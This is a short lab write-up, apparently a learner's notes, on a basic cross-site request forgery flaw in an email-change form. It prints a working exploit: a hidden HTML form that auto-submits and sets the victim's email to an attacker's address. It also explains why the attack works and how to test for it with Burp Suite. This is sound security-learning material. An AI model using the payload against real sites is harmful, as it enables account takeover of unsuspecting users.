# CSRF Lab 1 - Basic CSRF vulnerability

## What was vulnerable
Email change functionality — no CSRF token required.
Any website could send a POST request to change 
the victim's email without their knowledge.

## What I did
Created malicious HTML page with a form 
pointing to the vulnerable endpoint:

<form method="POST" action="https://target/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

Delivered exploit to victim — email changed automatically.

## Why it worked
No CSRF token = server couldn't verify the request
came from the legitimate site.
Victim's browser automatically sent session cookies
with the request.

## How to detect in real pentest
1. Find actions that change account data
2. Intercept request in Burp Suite
3. Check if request contains CSRF token
4. No token = test with exploit HTML

## Real world impact
Attacker can change victim's email = account takeover.
Change password, make transactions, delete account.
